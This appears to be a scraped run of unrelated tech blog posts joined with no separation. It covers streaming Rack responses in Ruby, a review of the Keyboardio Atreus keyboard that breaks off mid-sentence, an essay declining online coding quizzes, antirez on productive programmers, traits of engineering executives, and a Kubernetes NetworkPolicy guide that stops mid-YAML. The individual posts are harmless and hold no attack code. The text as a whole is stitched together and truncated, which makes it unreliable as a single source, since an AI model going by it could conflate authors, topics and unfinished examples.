Almost every Ruby program that handles HTTP requests will use the <a href="https://github.com/rack/rack"><code>Rack</code></a> interface to do so. <code>Rack</code> is an interface describing what applications can expect an HTTP request to look like and how they should respond. Having a common interface for this allows any web framework (such as Rails or Sinatra) to interoperate with any of the available servers (like Unicorn, Puma, or Falcon). In this post we’ll look at a subset of HTTP responses, namely those where the response body is not completely known when the response starts or which are too large to completely fit into memory. These responses must therefore be generated dynamically and streamed to the client.</p>
<h2 id="how-rack-handles-responses">How Rack handles responses</h2>
<p>All Rack responses are of the form <code>[&lt;response code&gt;, &lt;hash with headers&gt;, &lt;response body&gt;]</code>, where the response body can be any object that will yield zero or more <code>Strings</code> when <code>each</code> is called on it. A very simple example would be an <code>Array</code> with one <code>String</code> in it, like <code>['Hello world!']</code>. However, it is also possible to make your own classes that have arbitrary complexity in their <code>each</code> method. With this, you can implement more sophisticated behavior like ranged requests and streaming responses. A very simple example would be the following class that just streams the numbers 1 to 10 at one second intervals:</p>
<div id="cb1"><pre><code><span id="cb1-1"><a href="#cb1-1"></a><span>class</span> <span>SlowStreamer</span></span>
<span id="cb1-2"><a href="#cb1-2"></a>  <span>def</span> each</span>
<span id="cb1-3"><a href="#cb1-3"></a>    (<span>1</span>..<span>10</span>).each <span>do</span> |i|</span>
<span id="cb1-4"><a href="#cb1-4"></a>      <span>yield</span> (i.to_s + <span>"\n"</span>)</span>
<span id="cb1-5"><a href="#cb1-5"></a>      sleep <span>1</span></span>
<span id="cb1-6"><a href="#cb1-6"></a>    <span>end</span></span>
<span id="cb1-7"><a href="#cb1-7"></a>  <span>end</span></span>
<span id="cb1-8"><a href="#cb1-8"></a><span>end</span></span></code></pre></div>
<p>You could put a <code>SlowStreamer.new</code> into a Rack response and any Ruby server (ie Puma, Unicorn, Thin, Falcon, etc) will stream this for you without problems. It’s not even required to add a <code>Content-Length</code> header because these servers will automatically apply chunked encoding for you. This basic building block can be used for a lot of different applications.</p>
<h2 id="zip-streaming">Zip streaming</h2>
<p>The <a href="https://en.wikipedia.org/wiki/Zip_(file_format)">structure of a zip file</a> consists of a number of sections, each of which consists of a header, the actual file contents and then an optional footer. At the end of the file is another section called the “central directory”, which contains more metadata. All these values are just sequences of bytes, which means that they can be represented as <code>String</code>s with the <code>BINARY</code> encoding. By <code>yield</code>ing each of those values in turn, it’s possible to dynamically create and stream out an entire zip file in an HTTP response and this is exactly what the <a href="https://github.com/WeTransfer/zip_tricks">ZipTricks</a> gem provides:</p>
<div id="cb2"><pre><code><span id="cb2-1"><a href="#cb2-1"></a>body = <span>ZipTricks</span>::<span>RackBody</span>.new <span>do</span> | zip |</span>
<span id="cb2-2"><a href="#cb2-2"></a>  zip.write_stored_file(<span>'mov.mp4'</span>) <span>do</span> |sink| <span># Those MPEG4 files do not compress that well</span></span>
<span id="cb2-3"><a href="#cb2-3"></a>    <span>File</span>.open(<span>'mov.mp4'</span>, <span>'rb'</span>){|source| <span>IO</span>.copy_stream(source, sink) }</span>
<span id="cb2-4"><a href="#cb2-4"></a>  <span>end</span></span>
<span id="cb2-5"><a href="#cb2-5"></a>  zip.write_deflated_file(<span>'long-novel.txt'</span>) <span>do</span> |sink|</span>
<span id="cb2-6"><a href="#cb2-6"></a>    <span>File</span>.open(<span>'novel.txt'</span>, <span>'rb'</span>){|source| <span>IO</span>.copy_stream(source, sink) }</span>
<span id="cb2-7"><a href="#cb2-7"></a>  <span>end</span></span>
<span id="cb2-8"><a href="#cb2-8"></a><span>end</span></span>
<span id="cb2-9"><a href="#cb2-9"></a>[<span>200</span>, {}, body]</span></code></pre></div>
<p>This snippet will take care of generating all the zip-specific bits you will need and <code>yield</code> them in turn. It is quite feasible to have a big list of files and just <code>@files.each</code> all of those files into the <code>RackBody</code>. No matter how large these files are, the amount of memory used for the response will remain small.</p>
<h2 id="ranged-requests">Ranged requests</h2>
<p>HTTP requests can have a <code>Range</code> header attached to indicate that the client does not want the entire response but only a part of it. This is fairly easy to implement if the response is a short <code>String</code> or even a smallish file on disk, but if the response is composed of several (possibly many) long strings or files together, then things get a lot trickier. Luckily, there’s a gem for that too. The <a href="https://github.com/WeTransfer/interval_response"><code>interval_response</code></a> gem can, for example, be given a list of filepaths to be composed together (if you are streaming log files for example) and will automatically compute which parts of which file is requires. It will make sure that only one file at a time is opened and that only a constant amount of memory is required no matter the size of the file.</p>
<div id="cb3"><pre><code><span id="cb3-1"><a href="#cb3-1"></a>lazy_files = log_paths.map { |path| <span>IntervalResponse</span>::<span>LazyFile</span>.new(path) }</span>
<span id="cb3-2"><a href="#cb3-2"></a>interval_sequence = <span>IntervalResponse</span>::<span>Sequence</span>.new(*lazy_files)</span>
<span id="cb3-3"><a href="#cb3-3"></a>response = <span>IntervalResponse</span>.new(interval_sequence, env)</span>
<span id="cb3-4"><a href="#cb3-4"></a>response.to_rack_response_triplet</span></code></pre></div>
<p>The trick is once again carefully choosing where and how to <code>yield</code> (or not, in this case) your <code>String</code>s so that in the end only the parts of the body that the user actually requested are actually computed.</p>
<h2 id="rails-and-sinatra-streaming-helpers">Rails and Sinatra streaming helpers</h2>
<p>It’s fairly uncommon in the Ruby world to program directly against the Rack interface that web servers expose. Usually, we use a framework that implements a lot of the boilerplate code like routing, logging, etc. Both Rails and Sinatra have defined helpers to let you easily define streaming responses for your app.</p>
<h3 id="rails">Rails</h3>
<p>In Rails, include <a href="https://api.rubyonrails.org/classes/ActionController/Live.html"><code>ActionController::Live</code></a> into any controller that needs to stream its responses, then provide a <code>stream</code> method that will actually write to the response:</p>
<div id="cb4"><pre><code><span id="cb4-1"><a href="#cb4-1"></a><span>def</span> stream</span>
<span id="cb4-2"><a href="#cb4-2"></a>  <span>100</span>.times {</span>
<span id="cb4-3"><a href="#cb4-3"></a>    response.stream.write <span>"hello world\n"</span></span>
<span id="cb4-4"><a href="#cb4-4"></a>    sleep <span>1</span></span>
<span id="cb4-5"><a href="#cb4-5"></a>  }</span>
<span id="cb4-6"><a href="#cb4-6"></a><span>ensure</span></span>
<span id="cb4-7"><a href="#cb4-7"></a>  response.stream.close</span>
<span id="cb4-8"><a href="#cb4-8"></a><span>end</span></span></code></pre></div>
<h3 id="sinatra">Sinatra</h3>
<p>In Sinatra you can call <code>stream</code> in any route handler. It takes a block that takes an <code>out</code> parameter representing the output which you can <code>&lt;&lt;</code> the data into:</p>
<div id="cb5"><pre><code><span id="cb5-1"><a href="#cb5-1"></a>get <span>'/my-endpoint'</span> <span>do</span></span>
<span id="cb5-2"><a href="#cb5-2"></a>  stream <span>do</span> |out|</span>
<span id="cb5-3"><a href="#cb5-3"></a>    <span>100</span>.times <span>do</span> |i|</span>
<span id="cb5-4"><a href="#cb5-4"></a>      out &lt;&lt; <span>"hello world\n"</span></span>
<span id="cb5-5"><a href="#cb5-5"></a>      sleep <span>1</span></span>
<span id="cb5-6"><a href="#cb5-6"></a>    <span>end</span></span>
<span id="cb5-7"><a href="#cb5-7"></a>  <span>end</span></span>
<span id="cb5-8"><a href="#cb5-8"></a><span>end</span></span></code></pre></div>
<h2 id="conclusion">Conclusion</h2>
<p>Rack’s choice to allow anything that responds to <code>each</code> to function as a response body makes streaming very straightforward, it also allows us to create dynamic reponse bodies very easily. A small caveat is that you should be careful when creating a response body that will <code>yield</code> many small strings. Most servers will assume that you are doing this intentionally and will use the <code>write()</code> syscall on every string yielded, potentially causing a lot of OS overhead. In <a href="https://github.com/WeTransfer/zip_tricks/issues/78">one example</a> we were able to get a 4-fold increase in requests per second just by combining the smaller chunks into bigger ones before releasing them to the server.</p>
<p>If you require more fancy response types such as websocket upgrades, you’ll probably want to look into <a href="http://www.wjwh.eu/posts/2018-10-29-double-hijack.html">socket hijacking</a> as that allows you a lot more control over the socket. Happy streaming!</p>

  <h2>Open Source Keyboardio Atreus Keyboard – Six Week Review</h2>
  <p>As I write this, I've now had my Keyboardio Atreus for a full six weeks and have been
using it pretty much exclusively that whole time.  After a month and a half, I've given it
a fair shake and can give you my full impressions.  And my full impression is that it is
<strong>amazing</strong>.</p>

<h2 id="atreus-background">Atreus background</h2>
<p>Before I tell you what I love about it, what <em>is</em> the Atreus?  Well, it's a keyboard. It's
a <em>tiny</em> keyboard.</p>
<p>More specifically, it's a keyboard with 44 keys – compared with 84 on my ThinkPad
keyboard, and a full 108 on a traditional desktop keyboard.  How does it get by with so
few keys?  More on that in a minute; for now, just focus on how small the thing is,
without needing to cramp any of the individual keys in the least.</p>
<p><img src="https://www.codesections.com/blog/atreus-review/atreus.jpeg" alt="The Atreus keyboard on top of a ThinkPad"></p>
<span id="continue-reading"></span>
<p>Just from that photo, you might notice a few other features of the Atreus.  First – and
unlike nearly every other keyboard in existence – its keys are arranged into columns
rather than rows: the <code>D</code> is exactly even with the <code>E</code> key above it, but isn't vertically
aligned with the <code>F</code> key to its right.  Both of these changes make the Atreus <em>far</em> more
ergonomic to use.  Aligning the keys horizontally means that your fingers don't need move
diagonally nearly as often (a big contributor to RSI).  And moving the keys out of
horizontal rows aligns them more comfortably with the lengths of your fingers.  This
ortholinear layout is designed to make the Atreus significantly more comfortable and, more
importantly, to reduce the strain inherent in typing.</p>
<p>The other feature you likely noticed from the image is that my Atreus doesn't have any
letters on the keys.  That's not a requirement – they also offer the Atreus with keycaps
made out of "bright white PBT, which is dye-sublimated black and then laser-ablated to
reveal bright white legends".  As fancy as that sounds, I opted for the blank keycaps
because it helps with the Atreus's <em>other</em> superpower.</p>
<p>Aside from its compact and ergonomic form factor, the Atreus's standout feature is its
full and easy customization.  You can set exactly what you want to happen on every key
press, whether that's sending a single key or executing a complex series of commands.  And
all of this happens at the firmware level on the keyboard – which means it Just Works™ on
any computer you might plug the Atreus into, without any software.</p>

<p>The Atreus actually offers two ways to customize the keys: A GUI configuration tool called
Chrysalis (shown below) and text-based configuration via Kaleidoscope. </p>
<p><img src="https://www.codesections.com/blog/atreus-review/chrysalis.png" alt="Chrysalis screenshot with default QWERTY layout"></p>
<p>And all of this is powered by fully open source code.  The Atreus <a href="https://atreus.technomancy.us/">began
life</a> as a DIY project by the noted Free Software hacker
and language designer Phil Hagelberg (aka <a href="https://atreus.technomancy.us/">technomancy</a>),
and is now manufactured by Keyboardio; between the two of them, they've maintained an
admirable commitment to building the Atreus on free software.</p>
<p>So, now you know what the Atreus is: it's tiny, it's customizable, and it's fully powered
by free software.  But what's it like to actually <em>use</em> the thing?</p>
<h2 id="how-does-it-all-fit">How does it all fit?</h2>
<p>Let's talk about the point I put off above: just how do you use a keyboard that
only has 44 keys?  Even if we're only typing English ASCII text, we need to be able to
type 26 letters, 10 numerals, and 30 special characters.  Simple arithmetic is enough to
show that those 66 letters won't fit into 44 keys in a straightforward way – and that's
without considering non-printing characters or modifiers.</p>
<p>But it's actually modifiers that make the Atreus possible.  A typical keyboard has four
(or more) modifiers: Ctrl, Alt, Left Shift, and Right Shift.  Many keyboards will have
more than one Ctrl key, but they'll <em>all</em> have two Shift keys.  Why?  Well, as anyone who
has ever learned to touch type can tell you, there are two Shift keys so that you can hold
one with your right pinky when you type keys on the left side of the keyboard and can
hold the other with your left pinky whenever you type keys on the right side of the
keyboard.  If we only had one shift key to hit with our pinky, we'd have to contort our
hand mightily to enter capital letters on that side of the keyboard.</p>
<p>But we're only in that bind because we're forced to use our pinkies to hit the Shift
keys.  The Atreus moves that duty away from our weakest finger and to our strongest finger
– a finger that, incidentally, is ridiculously underused in a traditional keyboard
layout.  With the Atreus, you press the Shift key with your left thumb.  That means you
can press shift without moving your fingers out of position on the home row; moreover, in
combination with the Atreus's smaller number of keys, it means you can comfortably hold
the left shift key while pressing any other key on the keyboard.</p>
<p>That may not sound like a huge win – if all it does for us is get rid of the right Shift
key, then it just saves the Atreus a single key.  However, because the Atreus is
symmetrical, everything we just said about the left Shift key is equally true of the right
Shift key: you can also hold it while comfortably pressing every key on the keyboard.
Except we just said that we don't need a right Shift key.</p>
<p>Or, at least, we don't need a right Shift key that shifts us into typing capital letters.
Instead, we can use the right "Shift" key to shift us into a different set of characters
altogether.  This might sound a bit odd (and I acknowledge that it takes some getting used
to) but it's not really that different from how the Shift key works on a normal keyboard.
On a normal keyboard, you enter the <code>?</code> character by pressing <code>Shift</code> and <code>/</code> at the same
time; that's not because a question mark is somehow a "capital slash" (which, anyway,
sounds more like something a corporate raider would do than an item of punctuation).
Shifting into the other set of characters – the Atreus calls them Layer 2 – works just
like that, but for everything. </p>
<p><img src="https://www.codesections.com/blog/atreus-review/layer.png" alt="Layer 2 keys with default bindings"></p>
<p>That gives us up to an extra 43 effective keys to play with (since we're holding one key
down, we can't assign a new value to it), which would put us at 87 keys – already more
than my ThinkPad keyboard.  In practice, however, you probably don't want to assign a
different character for <em>every</em> key; the default bindings leave 8 with their Layer 1
meanings, which leaves us with just 79 effective keys.  So we're still short of a laptop
keyboard, to say nothing of a traditional desktop one.</p>
<p>Talking about Layer 1 and Layer 2 has probably made the solution to this obvious: add a
Layer 3!  And that's exactly what the default bindings do, adding another 25 keys, which
brings us up to 104 effective keys and parity with a full desktop keyboard.</p>
<p>But how do we access Layer 3?  We could dedicate another thumb key to it (which is what I
do in my personal configuration), but the default bindings go a different direction:
instead of accessing the layer by holding a key, you toggle into it by pressing a key
(i.e., instead of being like Shift, it's like CapsLock).</p>
<h2 id="ok-but-why">Ok, but why?!</h2>
<p>At this point, you probably get the <em>how</em> behind the Atreus's method for fitting 100+ keys
worth of functionality into just 44 keys.  But I wouldn't blame you if you're fuzzy on the
<em>why</em>.  Why go through all that trouble (and the learning curve of at least slightly
retraining your fingers) just to get back to the same number of keys that we started with?</p>
<p>Well, for some people, part of the appeal might be portability; Keyboardio even offers a
<a href="https://shop.keyboard.io/products/keyboardio-atreus-travel-case">travel case</a>.  It could
be the perfect keyboard to take with you when you work from a coffee shop, co-working
space, or other crowded public space!</p>

<p>The Atreus really was first designed as an ergonomic keyboard that <a href="https://technomancy.us/172">you can take to local
coffee shops</a>.  But, even when coffee-shop-working was an
option, I was never interested in the Atreus for that sort of portability.  I like the
idea of a small keyboard for three reasons: ergonomics, consistency, and speed.</p>
<h3 id="ergonomics">Ergonomics</h3>
<p>A big part of the reason I started looking at switching to a non-laptop keyboard is that
I'd started to experience a bit of discomfort after long stretches of coding.  Nothing
bad; nothing I'd even call pain.  But something noticeable, and I'm inclined to take even
a <em>hint</em> of Repetitive Strain Injury very seriously – especially given how many <a href="http://ergoemacs.org/emacs/emacs_hand_pain_celebrity.html">
programmers</a> have <a href="https://medium.com/@mdlayher/a-programmers-journey-with-rsi-c73628eed0c4">dealt with
RSI</a>.  And,
while there's a lot of disagreement about RSI, nearly everyone agrees that prevention is
far, far easier than cure.</p>
<p>If you take a look at <a href="http://xahlee.info/kbd/ergonomic_keyboards.html">lists</a> of <a href="https://www.nytimes.com/wirecutter/reviews/comfortable-ergo-keyboard/">best
ergonomic
keyboards</a>, you
probably won't see the Atreus. Partly, that's because it's new, and a bit less mainstream;
it might not be on everyone's radar.  But even accounting for that, the Atreus is missing
at least a few features that the most ergonomic keyboard have – though it does have most
of them.  Here, have a chart comparing the Atreus, the
<a href="https://ergodox-ez.com/">Ergodox-EZ</a>, and the
<a href="https://github.com/adereth/dactyl-keyboard">Dactyl</a>.</p>

<p>So, given the Atreus's strong but definitely trailing showing on those traditional
ergonomic factors, why am I still enthusiastic about the Atreus as an ergonomic keyboard?</p>
<p>Well, it comes down to what each finger is being asked to do – or, put differently, it
comes right back to how tiny the Atreus is.  If you look at the <a href="https://ergodox-ez.com/pages/getting-started">default layout of the
Ergodox-EZ</a>, you'll see that each pinky
is responsible for <strong>ten</strong> keys, many of which involve the more-ergonomically harmful
diagonal movement.  Two keys (in the default layout, <code>=</code> and <code>-</code>) require stretching your
pinky two keys up and one to the side – at least for me, that'd be quite the stretch.  In
contrast, the Atreus asks your pinky to be responsible for only four keys, none of which
involve diagonal movement, and only one of which is more than one key away.</p>
<p>I know I'm harping on the pinkies a bit but, well, there's a reason some people call RSI
<a href="https://skeptics.stackexchange.com/questions/17492/does-emacs-cause-emacs-pinky">Emacs
Pinky</a>.
The pinky is, obviously, one of the weakest fingers, and asking it to do a lot is a fast
way to overtax your hands.  And some of those big stretches can be even more …</p></section></div>

							<p>With nearly a decade of making apps professionally, I’ve been through all the ways recruiters use to evaluate candidates: Coding quizzes, peer programming sessions, writing tests, writing documentation, feature scoping, code audit, etc.</p><p>I have also been on the other side of the table a few times to evaluate new hires, so I understand the end game: Recruiters get lots of applications and they cannot afford to interview each one of the good ones. <br></p><p>As such the situation below was born:<br></p><blockquote><p><b>Companies are looking for a way to create a funnel, to <b>automatically</b> filter out&nbsp; the “bad” fits. <br></b></p><p><b>And the simple way to do that came from academia i.e Grades.</b></p></blockquote><p>So Codility, Hacker Rank, Dev Skiller and co. were born out of this need.</p><p> But they focused so much on the end goal (<b>saving the company time by only allowing a few</b>) that they forgot about the actual evaluation. Programming tests are a good fit for people who are good at preparing for them. The college graduates or the people who have enough free time to practice weekly on those platforms.<br></p><p>I don’t have the time to rehearse 
(or reverse) binary trees and take your test and ship a home assignment and do a technical interview. Specially since the real job doesn’t include re implementing a sorting algorithms.<br></p><p><b><i>I have no issues with assignments and take home projects</i></b> because although I
 have <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fgithub.com%2Fahbou%2F&amp;t=MDgxNzk4NDU2ZDgxZmI2ZTdjZjc3MDAzN2YwY2NlYjRlY2QzNjIzOCxFUFZ0MldZaA%3D%3D&amp;b=t%3ApNqn9Es7-Uwh3xaGTNcJRQ&amp;p=https%3A%2F%2Fahbou.org%2Fpost%2F635229336295899136%2Fsorry-i-wont-take-your-online-coding-quiz&amp;m=1&amp;ts=1606105658" target="_blank">code available publicly </a>it might not be recent enough. So a small project is a good way to evaluate a candidate’s thinking, architectural choices and coding style if the said project is either paid or takes a couple of hours to finish.<br></p><p>Anyway, I’ve decided I will not take any programming tests anymore.<br></p>

November 19, 2020 | https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez | <a href="https://web.archive.org/web/*/https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Preface from Sklivvz: I met Salvatore (Antirez) when I was working at <a href="https://stackoverflow.com/">Stack Overflow</a> and he was the maintainer of Redis, one of the major parts of our infrastructure. Besides our common Italian heritage, what struck me was that we shared very many ideas about programming. This became absolutely evident when we took a few days and Antirez showed me the beautiful Redis code base. I've asked him to share some of his thoughts here.</p>
<p>In the mythology of programming, a 10x programmer is a programmer that can do ten times the work of another typical programmer. The programming community is exceptionally polarized about the existence or not of such a beast. However, many people told me that they believe I’m a very fast programmer. Considering I’m far from being a workaholic, I have put together a list of qualities that I believe make the most difference in programmers’ productivity.</p>
<h2>Bare programming abilities</h2>
<p>One of the most self-evident limits or strengths of a programmer is the skill to effectively implementing the basic parts of a program: a function, an algorithm, or whatever. Surprisingly the ability to use basic imperative programming constructs very efficiently to implement something is, in my experience, not as widespread as one may think. I observed experienced yet uneducated programmers getting more work done than graduate programmers, in theory extremely competent, but very poor at implementing solutions.</p>
<h2>Focus</h2>
<p>The number of hours spent writing code is irrelevant without looking at the quality of the time. External and internal factors can cause a lack of focus. Internal factors cause procrastination. They can be things like lack of interest in the project at hand (you can’t be good at doing things you do not love), lack of exercise or well-being, and poor or little sleeping. External factors are frequent meetings, work environments without actual offices, coworkers interrupting often, etcetera. It seems natural that trying to improve focus and to reduce interruptions is going to have a significant effect on programming productivity. Sometimes to gain focus, extreme measures are needed. For instance, I only read emails from time to time and do not reply to most of them.</p>
<h2>Design sacrifice</h2>
<p>Often complexity is generated when a non-fundamental goal of a project is accounting for a considerable amount of design complexity. In other cases, there is a design tension between a fundamental feature and a non-fundamental one, and this is making the more important goal very hard to reach.
A designer needs to recognize the parts of a design that are not easy wins or where there is no proportionality between the effort and the advantages. To execute a project maximizing the output, one needs to focus precisely on the aspects that matter, and that they can implement in a reasonable amount of time.
When designing the Disque message broker, I realized that by providing only best-effort ordering for the messages, I could substantially improve all the other aspects of the project: availability, query language, and client interaction, simplicity, and performance.</p>
<h2>Simplicity</h2>
<p>Simplicity is an obvious point that means all and nothing. It is worth to check how we often generate complexity to understand what simplicity is. I believe that the two main drivers of complexity are the unwillingness to perform design sacrifices and the accumulation of errors in the design activity.</p>
<p>If you think of the design process, each time we pursue a wrong path, we get farther and farther from the optimal solution. An initial design error, in the wrong hands, is not corrected with a re-design of the same system. It leads to the design of another complex solution to cope with the initial error. The project, thus, becomes more complex and less efficient at every wrong step.</p>
<p><img src="https://imgur.com/qPJakrY.png" alt="simplicity"></p>
<p>We can achieve simplicity by thinking in terms of small mental “proofs of concept” so that we can explore a large number of simple designs with our minds. This technique allows us to start working from something that looks like the most viable and direct solution. Later, experience and personal design abilities allow us to improve the design and find sensible solutions for the sub-design issues that we need to resolve.</p>
<p>However, each time a complex solution seems to be warranted, it’s essential to think deeply about how to avoid this complexity. Only continue in that direction as the last resort, even considering completely different design alternatives.</p>
<h2>Perfectionism</h2>
<p>Perfectionism comes in two variants: an engineering culture of reaching the best possible measurable performance in a program, and a personality trait. In both instances, I see this as one of the most significant barriers for a programmer to deliver things fast. Perfectionism and fear of external judgment bias us to refine a design only according to psychological or trivially measurable parameters. Instead, we tend to forget things like robustness, simplicity, ability to deliver in time. </p>
<h2>Knowledge</h2>
<p>When dealing with complex tasks, knowledge of data structures, fundamental limits of computation, non-trivial algorithms is going to have an impact on the ability to find a suitable design. It is not necessary to be a super expert in everything. Still, it is essential to be at least aware of a multitude of potential solutions for a problem. For example, it is possible to use algorithms which are very efficient at counting unique items in a stream, if we can accept some error percentage. Not everyone is familiar with them.</p>
<h2>Low-level understanding of the machine</h2>
<p>Many issues in programs, even when using high-level languages, arise from the misunderstanding of how the computer is going to perform a given task. Sometimes, this may lead to re-designing and re-implementing a tool from scratch because there is a fundamental problem in the tools or algorithms used. High competence in C, understanding of how CPUs work, and knowledge of how the kernel and system calls are implemented, can be essential in preventing bad, late-stage surprises.</p>
<h2>Debugging skills</h2>
<p>It is surprisingly easy to spend an enormous amount of effort to find bugs. Being able to focus on a bug incrementally and to fix it with a rational set of steps, together with having to deal with simple code that is unlikely to contain too many bugs, can have a significant effect on the programmer's efficiency.</p>
<p>In conclusion, it is not surprising to me to see how the above qualities of a programmer can have a 10x impact on the output. Combined, they allow for proper implementations of designs that start from a viable model and can be several times simpler than alternatives. There is a way to stress simplicity that I like to call “opportunistic programming.” Basically, at every development step, the set of features to implement is chosen to have the maximum impact on the user base of the program, with the minimum requirement of efforts.</p>

<p>Since I talk to so many tech executives and am exposed to a lot of companies of different sizes, I often get asked what makes the best stand out. Even though this is definitely a frequently-asked-question for me, I refrained from putting this into writing earlier as I felt like this is straightforward. Recent discussions made me realize my readers would find this useful, and so I decided to publish this. I would love to hear your thoughts! Without further ado, here are the traits that I see most common in successful VPEs (and some CTOs). </p>



<h3>Product Mastery</h3>



<p>One of the concepts that I keep harping on. Everyone in Engineering, and especially leadership, should be proficient in the company’s business. One has to understand the product, the problem it solves for the users, the users, the market, the competition, etc.</p>



<p>I gave a few examples on the <a href="https://www.techexecpodcast.com/episodes/product-mastery">Tech Exec Podcast</a>, but a recent one is the fact that some of the brightest Intel engineers are still unaware of the news about Apple’s new M1 chip. If someone disrupts your industry, you want your people to be on it—not to try and mimic it, but to understand where the market is going.</p>



<h3>Executive Mindset</h3>



<p>Another concept that <a href="https://avivbenyosef.com/the-executive-mindset/">comes up</a> a lot on here, which talks about the fact that the best leaders are forces of positivity and optimism. Many in our industry are used to cynical quips like Silicon Valley’s Gilfoyle. It might feel clever, but that kind of mindset doesn’t really rally the troops, does it?</p>



<p>Executive mindset is about projecting can-do—anything is possible. Start with that assumption and then see how you can make it work. Think about the difference, when someone shows you a chess set with a given position, between the question “what would you do next” and the instruction to “find the mate in two.” If someone tells you things are possible, you will try harder. That’s human nature.</p>



<h3>Instilling Purpose</h3>



<p>Going hand in hand with the executive’s own vision, being able to instill purpose in a team is how an executive creates momentum and keeps motivation high. I’ve written at length about this <a href="https://avivbenyosef.com/stop-being-a-floating-leader/">here</a>.</p>



<h3>Humility</h3>



<p>Humility is vitally important when it comes to how tech executives view the other departments in the organization. Do not underestimate the value of sales or marketing, or force decisions down Product’s throat just because you can.</p>



<p>Accept that those are professions that are essential for the company’s success, and work in tandem with them, and not opposing them. For more, see <a href="https://avivbenyosef.com/rnd-has-too-much-power-in-startups/">these</a> <a href="https://avivbenyosef.com/the-most-important-partnership/">articles</a>.</p>



<h3>Challenging the Status Quo</h3>



<p>Every organization needs to reinvent itself continually as it grows. That’s especially important for R&amp;D, where constantly changing the way things are being done is required to result in a steady stream of innovation and improvements that propel the company forward.</p>



<p>Getting used to “that’s how we do it” is easier and reduces cognitive load. Unfortunately, it also results in atrophy. Make <a href="https://avivbenyosef.com/the-habit-of-challenging-the-status-quo/">challenging the status</a> quo a habit.</p>



<h3>Take Healthy Bets</h3>



<p>Similarly, great leaders take on some risks. We’re not talking about regularly risking the business away on a whim. However, executives that are obsessed with predictability in the form of always hitting 100% of their promised roadmap are doing the company a disservice.</p>



<p>Learn to live with some risks; otherwise, you will regularly undershoot. Healthy bets are those where the gain outweighs the risk. Make sure to do your risk management properly (with preventive measures and contingencies in place) and move on. Not making a decision, not pushing harder, is riskiest.</p>



<h3>Speak Business</h3>



<p>Tech executives are responsible for the tech, but they have to be <em>executives</em>. Avoid explaining refactorings in technical terms, but teach your team to make the case for them with business ROI. Understand the roadmap so that you can help shape it and the work better. Become an integral part of the executive team.</p>



<p>The process of achieving this is what I call <em><a href="https://avivbenyosef.com/moving-upstream/">moving upstream</a></em>. It is a required must for becoming a top VPE.</p>



<p>I trust this list will provide you with some interesting things to focus on in 2021.</p>

<![CDATA[Securing Kubernetes: Using Network Policies to Control Traffic in Kubernetes]]>

<p>This is the first part of our “Kubernetes Security Series”. In this part I’m going to explain how Network Policies can help you secure your network traffic within your Kubernetes cluster.</p>



<h2>Filtering network traffic</h2>



<p>First of all, you need to think about what kind of network traffic you want to filter. The easiest way filtering traffic is on Layer 3 and 4, which is at the IP address and port level. If you’d like to filter on http/https hostname, then you’ll need Layer 7 filtering, which is currently not supported by Kubernetes Network Policies. For that, you would need a separate proxy server within your cluster.</p>



<p>On Layer 3 and 4 filtering, if you’d like to filter traffic to github.com, you’d filter based on the IP address and port 80/443 (http/https). If github.com changes IP address, you’d have to change your Network Policy rules. If you’re capable of doing Layer 7 filtering, then you could examine the hostname that passes port 80/443, and only filter if the hostname matches github.com. A sidenote: even on port 443 using https, if SNI (Server Name Indication) is used, then the hostname is passed unencrypted. SNI is currently widely used.</p>



<p>We’ll keep Layer 7 filtering for another blog post, as this is currently much more complicated, because you cannot use Network Policies for that. You would need an ingress/egress proxy that understands Layer 7 (http/https) traffic, like Envoy proxy. More traditional reverse proxies like haproxy/nginx could also be used for this.</p>



<h2>The Network Policy</h2>



<p>Let’s talk about the Network Policy itself! The NetworkPolicy resource in Kubernetes allows you to manage Layer 3 and 4 traffic on a pod level. The <a href="https://kubernetes.io/docs/concepts/services-networking/network-policies/">NetworkPolicy documentation</a> specifies 3 combinations you can use to manage traffic:</p>



<ol><li>Pod-to-pod traffic by identifying the pod using selectors (for example using pod labels)</li><li>Traffic rules based on Namespace (for example pod from namespace 1 can access all pods in namespace 2)</li><li>Rules based on IP blocks (taking into account that traffic to and from the node that the pod is running on is always allowed)</li></ol>

<h2>Secure network traffic</h2>



<p>To secure your network traffic, you will need to disable the default behavior to allow all ingress and egress traffic. To make this easier, you can first disable ingress traffic, figure out what rules you need to make your pods working again, and then start with egress traffic restrictions. It’s going to be much more difficult to figure out egress traffic rules than ingress traffic, as it’s often not obvious what external traffic your applications will initiate.</p>



<p>A Network Policy to deny all traffic by default will look like this:</p>



<pre><code>---
<strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;<strong>name</strong>: default-deny-all
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>: {}
&nbsp;&nbsp;<strong>policyTypes</strong>:
&nbsp;&nbsp;- Ingress
&nbsp;&nbsp;- Egress</code></pre>



<p>This rule will match all pods (podSelector: {}), and will deny ingress/egress traffic, if no other rule is in place to allow traffic.</p>



<h2>Ingress traffic</h2>



<p>Allowing ingress is the easiest to do if you have a single point of entry. This is the case if you’re using an ingress controller. You then only need to ensure access to the ingress controller, and from the ingress controller to the backend pods. Here is an example of such a NetworkPolicy:</p>



<pre><code>---
<strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;<strong>name</strong>: ingress-access
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;app.kubernetes.io/name: ingress-nginx
&nbsp;&nbsp;<strong>ingress</strong>:
&nbsp;&nbsp;- <strong>from</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>ipBlock</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cidr: 192.168.1.0/24
---
<strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;<strong>name</strong>: ingress-to-backends
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;app: myapp
